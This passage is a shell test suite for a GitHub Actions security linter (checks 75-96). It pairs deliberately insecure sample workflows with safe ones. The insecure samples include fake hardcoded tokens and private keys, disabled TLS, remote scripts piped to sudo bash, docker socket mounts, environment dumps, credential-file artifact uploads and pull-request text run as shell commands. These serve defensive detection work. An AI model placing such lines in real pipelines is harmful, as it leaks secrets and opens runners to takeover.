assert_detects "check 75 flags GitHub server-to-server token (ghs_)" "75" "credential" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: curl -H "Authorization: token ghs_abc123def456ghi789jkl012mno345pqr678" https://api.github.com
EOF

assert_detects "check 75 flags GitHub fine-grained PAT (github_pat_)" "75" "credential" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: export GH_TOKEN=github_pat_11ABCDE0Y0abc123def456ghijkl_LONGRANDOMSTRINGHEREABCDEFGHIJKLMNOPQRSTUVWXYZ1234567
EOF

assert_clean "check 75 accepts secrets context reference" "75" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: aws s3 ls
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
EOF

# --- Check 76: TLS certificate verification disabled ---

assert_detects "check 76 flags curl -k" "76" "certificate verification is disabled" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: curl -k -Lo /tmp/tool https://builds.example.com/tool && chmod +x /tmp/tool
EOF

assert_detects "check 76 flags curl --insecure" "76" "certificate verification is disabled" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: curl --insecure -o artifact.tar.gz https://builds.example.com/artifact.tar.gz
EOF

assert_detects "check 76 flags curl combined short -k option" "76" "certificate verification is disabled" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: curl -fsSkL https://repo.example.com/install.sh -o install.sh
EOF

assert_detects "check 76 flags wget --no-check-certificate" "76" "certificate verification is disabled" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: wget --no-check-certificate https://builds.example.com/binary -O /usr/local/bin/tool
EOF

assert_clean "check 76 accepts normal curl without disabling TLS" "76" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: curl -fsSL https://example.com/install.sh -o install.sh
EOF

# --- Check 77: pip install from insecure HTTP VCS source ---

assert_detects "check 77 flags pip install git+http://" "77" "VCS" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip install git+http://github.com/myorg/myrepo.git@main
EOF

assert_detects "check 77 flags pip3 install hg+http://" "77" "VCS" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip3 install hg+http://bitbucket.org/example/lib
EOF

assert_clean "check 77 accepts pip install git+https://" "77" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip install git+https://github.com/myorg/myrepo.git@abc123
EOF

# --- Check 78: hardcoded PEM private key ---

assert_detects "check 78 flags RSA private key marker" "78" "private key" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: |
          echo "-----BEGIN RSA PRIVATE KEY-----
          MIIEowIBAAKCAQEA2a2rwplBQLzMBCeXbCq1fICZmMlHKpxoqBfRtjG0=
          -----END RSA PRIVATE KEY-----" > /tmp/key
EOF

assert_detects "check 78 flags OpenSSH private key marker" "78" "private key" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: |
          echo "-----BEGIN OPENSSH PRIVATE KEY-----
          b3BlbnNzaC1rZXktdjEAAAAA...
          -----END OPENSSH PRIVATE KEY-----" > /tmp/key
EOF

assert_clean "check 78 accepts deploy key via secrets env var" "78" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: echo "$DEPLOY_KEY" > /tmp/key && chmod 600 /tmp/key
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
EOF

# --- Check 79: archive extraction to filesystem root ---

assert_detects "check 79 flags tar -C /" "79" "zip-slip" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: tar -xzf /tmp/artifact.tar.gz -C /
EOF

assert_detects "check 79 flags tar -C /usr/local/" "79" "zip-slip" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: tar -xzf toolchain.tar.gz -C /usr/local/
EOF

assert_detects "check 79 flags unzip -d /" "79" "zip-slip" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: unzip package.zip -d /
EOF

assert_clean "check 79 accepts tar to workspace subdirectory" "79" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: tar -xzf artifact.tar.gz -C /tmp/workspace/output/
EOF

# --- Check 80: hardcoded Slack/Discord webhook ---
# Note: assert_detects tests for check 80 are intentionally omitted.
# GitHub push protection blocks any commit containing real-format Slack/Discord
# webhook tokens — which is itself proof that check 80 is detecting the right pattern.
# The "clean" test below validates the allow-path (using secrets context).

assert_clean "check 80 accepts webhook URL from secrets" "80" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: curl -X POST -d '{"text":"done"}' "$SLACK_WEBHOOK"
        env:
          SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK_URL }}
EOF

# --- Check 81: pip --extra-index-url dependency confusion ---

assert_detects "check 81 flags pip install --extra-index-url without --no-index" "81" "confusion" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip install mypackage --extra-index-url https://private.registry.example.com/simple/
EOF

assert_clean "check 81 accepts pip install --extra-index-url with --no-index" "81" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip install mypackage --no-index --extra-index-url https://private.registry.example.com/simple/
EOF

# --- Check 82: docker host namespace / Docker socket escape ---

assert_detects "check 82 flags docker host pid namespace" "82" "runner host" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: docker run --pid=host ubuntu:22.04 ps aux
EOF

assert_detects "check 82 flags docker socket mount" "82" "runner host" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu:22.04 docker ps
EOF

assert_clean "check 82 accepts ordinary workspace bind mount" "82" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: docker run --rm -v "$PWD/out:/out" ubuntu:22.04 true
EOF

# --- Check 83: package manager TLS verification disabled ---

assert_detects "check 83 flags pip --trusted-host" "83" "TLS verification is disabled" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip install --trusted-host pypi.org --index-url https://pypi.org/simple mypackage
EOF

assert_detects "check 83 flags npm strict-ssl false" "83" "TLS verification is disabled" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: npm config set strict-ssl false
EOF

assert_clean "check 83 accepts package installs with TLS verification enabled" "83" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - run: pip install --index-url https://pypi.org/simple mypackage
      - run: npm config set strict-ssl true
EOF

# --- Check 84: pull_request_target with gh pr checkout ---

assert_detects "check 84 flags gh pr checkout in pull_request_target" "84" "gh pr checkout" <<'EOF'
name: test
on: pull_request_target
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - name: Checkout PR with gh
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: gh pr checkout "$PR_NUMBER"
      - run: make test
EOF

assert_clean "check 84 accepts gh pr checkout on unprivileged pull_request" "84" <<'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - name: Checkout PR with gh
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: gh pr checkout "$PR_NUMBER"
EOF

# --- Check 85: attacker-controlled env var executed as shell command ---

assert_detects "check 85 flags env var executed as shell command" "85" "env var is executed as a shell command" <<'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - env:
          CMD: ${{ github.event.pull_request.title }}
        run: $CMD
EOF

assert_clean "check 85 accepts env var printed as data" "85" <<'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - env:
          CMD: ${{ github.event.pull_request.title }}
        run: printf '%s\n' "$CMD"
EOF

assert_detects "check 85 flags sourced env var as shell code" "85" "env var is executed as a shell command" <<'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - env:
          SCRIPT: ${{ github.event.pull_request.head.ref }}
        run: source "${SCRIPT}"
EOF

assert_detects "check 85 flags exec of env var as shell command" "85" "env var is executed as a shell command" <<'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - env:
          CMD: ${{ github.event.comment.body }}
        run: exec "$CMD"
EOF

# --- Check 86: dynamic runs-on with attacker-controlled expression ---

assert_detects "check 86 flags dynamic runs-on from workflow input" "86" "runs-on contains attacker-controlled expression" <<'EOF'
name: test
on: workflow_dispatch
permissions: read-all
jobs:
  test:
    runs-on: ${{ inputs.runner-label }}
    timeout-minutes: 10
    steps:
      - run: echo hi
EOF

assert_detects "check 86 flags array runs-on from workflow input" "86" "runs-on contains attacker-controlled expression" <<'EOF'
name: test
on: workflow_dispatch
permissions: read-all
jobs:
  test:
    runs-on:
      - ubuntu-latest
      - ${{ inputs.runner-label }}
    timeout-minutes: 10
    steps:
      - run: echo hi
EOF

assert_clean "check 86 accepts dynamic runs-on from repo vars" "86" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  test:
    runs-on: ${{ vars.RUNNER_LABEL }}
    timeout-minutes: 10
    steps:
      - run: echo hi
EOF

# --- Check 87: dangerous or dynamic container options ---

assert_detects "check 87 flags privileged container options" "87" "Container options include dangerous host-level flags" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    container:
      image: ubuntu@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      options: --privileged
    steps:
      - run: id
EOF

assert_detects "check 87 flags dynamic container options" "87" "Container options include dangerous host-level flags" <<'EOF'
name: test
on: workflow_dispatch
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    container:
      image: alpine:3.20@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      options: --volume ${{ inputs.mount }}:/work
    steps:
      - run: echo hi
EOF

assert_detects "check 87 flags block dynamic container options" "87" "Container options include dangerous host-level flags" <<'EOF'
name: test
on: workflow_dispatch
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    container:
      image: alpine:3.20@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      options: |
        --volume ${{ inputs.mount }}:/work
    steps:
      - run: echo hi
EOF

assert_clean "check 87 accepts benign static container options" "87" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    container:
      image: ubuntu@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      options: --cpus 1
    steps:
      - run: id
EOF

# --- Check 88: action command/script inputs with attacker-controlled expressions ---

assert_detects "check 88 flags action command input expression" "88" "Action command/script input contains attacker-controlled expression" <<'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: nick-fields/retry@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          timeout_minutes: 1
          max_attempts: 1
          command: ${{ github.event.pull_request.title }}
EOF

assert_detects "check 88 flags block action script input expression" "88" "Action command/script input contains attacker-controlled expression" <<'EOF'
name: test
on: workflow_dispatch
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: some/action@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          script: |
            echo "${{ inputs.command }}"
EOF

assert_detects "check 88 flags action command input from job output" "88" "Action command/script input contains attacker-controlled expression" <<'EOF'
name: test
on: pull_request
permissions: read-all
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    outputs:
      shell-cmd: ${{ steps.gen.outputs.cmd }}
    steps:
      - id: gen
        run: echo "cmd=make test" >> "$GITHUB_OUTPUT"
  retry:
    needs: build
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: nick-fields/retry@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          timeout_minutes: 1
          max_attempts: 1
          command: ${{ needs.build.outputs.shell-cmd }}
EOF

assert_clean "check 88 accepts action command input from static text" "88" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: nick-fields/retry@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          timeout_minutes: 1
          max_attempts: 1
          command: npm test
EOF

# --- Check 89: environment/secret dump to logs ---

assert_detects "check 89 flags bare env dump" "89" "Dumps the full environment to logs" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - env:
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: env
EOF

assert_detects "check 89 flags printenv dump in run block" "89" "Dumps the full environment to logs" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: |
          echo start
          printenv | sort
EOF

assert_detects "check 89 flags export -p dump" "89" "Dumps the full environment to logs" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: export -p > vars.txt
EOF

assert_clean "check 89 accepts set -euo, env VAR=x cmd, and printenv VAR" "89" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: |
          set -euo pipefail
          env FOO=bar make build
          printenv GITHUB_REF
          echo "ref ${GITHUB_REF}"
EOF

# --- Check 90: sensitive credential files uploaded as build artifacts ---

assert_detects "check 90 flags SSH private key upload" "90" "Uploads a sensitive credential file" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/upload-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          name: keys
          path: ~/.ssh/id_rsa
EOF

assert_detects "check 90 flags .env in a multiline path list" "90" "Uploads a sensitive credential file" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/upload-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          name: bundle
          path: |
            dist/
            .env
EOF

assert_clean "check 90 accepts non-sensitive build output upload" "90" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/upload-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          name: env-report
          path: ./dist
EOF

# --- Check 91: SSH host key verification disabled ---

assert_detects "check 91 flags StrictHostKeyChecking=no" "91" "Disables SSH host key verification" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: ssh -o StrictHostKeyChecking=no deploy@host.example.com 'uptime'
EOF

assert_detects "check 91 flags UserKnownHostsFile=/dev/null" "91" "Disables SSH host key verification" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: scp -oStrictHostKeyChecking=false -oUserKnownHostsFile=/dev/null f host:/tmp/f
EOF

assert_clean "check 91 accepts StrictHostKeyChecking=accept-new" "91" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: ssh -o StrictHostKeyChecking=accept-new deploy@host.example.com 'uptime'
EOF

# --- Check 92: TLS verification disabled via git/runtime configuration ---

assert_detects "check 92 flags git http.sslVerify=false" "92" "Disables TLS certificate verification" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: git -c http.sslVerify=false clone https://repo.example.com/x.git
EOF

assert_detects "check 92 flags NODE_TLS_REJECT_UNAUTHORIZED=0" "92" "Disables TLS certificate verification" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - env:
          NODE_TLS_REJECT_UNAUTHORIZED: 0
        run: node fetch.js
EOF

assert_clean "check 92 accepts verification left enabled" "92" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - env:
          NODE_TLS_REJECT_UNAUTHORIZED: 1
        run: git clone https://repo.example.com/x.git
EOF

# --- Check 93: cleartext HTTP download via curl/wget ---

assert_detects "check 93 flags curl http download" "93" "Downloads content over cleartext HTTP" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: curl -fsSL http://downloads.example.com/tool.tar.gz -o tool.tar.gz
EOF

assert_detects "check 93 flags wget http download" "93" "Downloads content over cleartext HTTP" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: wget http://downloads.example.com/installer.sh
EOF

assert_clean "check 93 accepts https and loopback http probe" "93" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: |
          curl -fsSL https://downloads.example.com/tool.tgz -o tool.tgz
          curl -sf http://localhost:8000/health
          curl http://127.0.0.1:9000/ready
EOF

# --- Check 94: remote script piped to an interpreter or privileged shell ---

assert_detects "check 94 flags curl piped to python" "94" "Pipes a downloaded script into an interpreter" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: curl -sSL https://example.com/get.py | python3
EOF

assert_detects "check 94 flags curl piped to sudo bash" "94" "Pipes a downloaded script into an interpreter" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: curl -sSL https://example.com/i.sh | sudo bash
EOF

assert_clean "check 94 accepts curl|bash (check 10) and grep python" "94" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: |
          curl -sSL https://example.com/i.sh | bash
          curl -sSL https://example.com/list | grep python
          python3 build.py
EOF

# --- Check 95: insecure git transport (git:// or http://) ---

assert_detects "check 95 flags git:// clone" "95" "Uses an insecure git transport" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: git clone git://github.com/example/repo.git
EOF

assert_detects "check 95 flags git clone over http" "95" "Uses an insecure git transport" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: git clone http://internal.example.com/repo.git
EOF

assert_clean "check 95 accepts https git clone" "95" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: |
          git clone https://github.com/example/repo.git
          git remote -v   # docs at http://example.com/help
EOF

# --- Check 96: github.token interpolation in run blocks ---

assert_detects "check 96 flags github.token in run block" "96" "github.token }} directly in run: block" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: git remote set-url origin https://x-access-token:${{ github.token }}@github.com/o/r.git
EOF

assert_detects "check 96 flags github.token echoed in run block" "96" "github.token }} directly in run: block" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - run: echo "${{ github.token }}"
EOF

assert_clean "check 96 accepts github.token passed via env/with" "96" <<'EOF'
name: test
on: push
permissions: read-all
jobs:
  t:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - env:
          GH_TOKEN: ${{ github.token }}
        run: gh pr list
      - uses: some/action@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        with:
          github-token: ${{ github.token }}
EOF

printf '\n'
printf '%s\n' "Results: ${passed} passed, ${failed} failed"

if [[ ${failed} -ne 0 ]]; then
    exit 1
fi
